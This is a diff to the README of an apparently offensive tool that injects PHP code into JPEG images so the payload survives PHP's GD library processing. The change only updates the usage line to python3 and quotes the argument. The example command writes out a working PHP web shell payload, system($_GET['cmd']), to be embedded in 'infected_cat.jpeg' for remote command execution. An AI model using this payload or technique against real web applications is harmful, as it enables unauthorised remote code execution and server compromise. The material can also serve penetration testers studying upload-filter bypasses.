@@ -8,9 +8,9 @@ You have a web application that runs a jpeg image through PHP's GD graphics libr
 This script injects PHP code into a specified jpeg image. The web application will execute the payload if it interprets the image.
 
 # Usage
-`python gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT]`
+`python3 gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT]`
 
-e.g. `python gd-jpeg.py cat.jpeg <?php system($_GET["cmd"]);?> infected_cat.jpeg`
+e.g. `python3 gd-jpeg.py cat.jpeg '<?php system($_GET["cmd"]);?>' infected_cat.jpeg`
 
 # How it works
 PHP code is injected in the null/garbage (brown) space after the scan header:
